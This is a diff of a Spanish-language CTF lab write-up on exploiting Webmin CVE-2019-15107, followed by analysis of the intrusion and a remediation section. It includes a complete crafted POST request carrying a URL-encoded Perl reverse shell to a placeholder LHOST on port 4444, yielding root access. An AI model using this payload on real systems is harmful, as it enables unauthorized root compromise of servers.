@@ -14,7 +14,7 @@
 En la room en si nos dicen que es una vulnerabilidad reciente y que no necesitamos autentificacón para explotarla, eso nos deja un único candidato
 ### CVE 2019-15107
 
-Los exploit que he encontrado sin metasploit todos inyectan solo en el parametro old, pero por algún motivo que ahora mismo desconozco para que el exploit funcione de manera correcta hay que inyectar tambien el expired, para ello crafteamos la siguiente request en burpsuite y con ello obtenemos una reverse shell en nuestra máquina
+Los exploit que he encontrado sin metasploit todos inyectan solo en el parametro old, pero por algún motivo que ahora mismo desconozco para que el exploit funcione de manera correcta hay que inyectar tambien el expired, para ello crafteamos la siguiente request y la mandamos en burpsuite y con ello obtenemos una reverse shell en nuestra máquina
 ```
 POST /password_change.cgi HTTP/1.1
 Host: 10.10.156.161:10000
@@ -28,9 +28,21 @@ cache-control: no-cache
 expired=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22(LHOST)3A4444%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27&new1=haxxedid
 &new2=haxxed&old=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22(LHOST)%3A4444%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27
 ```
+Con esta request ya lanzada solo nos queda abrir un listener en local y tenemos automaticamente shell como root
 
 # Analisís de la intrusión
-## CVE
-
+### CVE 2019-15107
+Ese CVE nos permitio acceder a la máquina por un fallo de diseño en las versions de webmin anteriores a la 1.9.20 que permite ejecutar código de manera malicioso mediante una request crafteada , para hacer creer al servidor que la request viene de un usuario ya autenticado
+### Webmin as root
+El servicio webmin esta lanzado como root de modo que en el momento que lo comprometemos tenemos acceso a todo el servidor con maximos privilegios
 # Soluciones 
-## CVE
+## CVE 2019-15107
+Para solucionar este problema la mejor solución posible es actualizar a una nueva version, 1.9.30 o superior. si esto no fuese posbile por compatibilidad o otro motivo existe un fix para versiones de la 1.9.X que consiste en editar el archivo
+```
+/etc/webmin/miniserv.conf, 
+```
+Eliminando la siguienqte linea 
+```
+passwd_mode= 
+```
+Y reiniciando el servicio tras esto
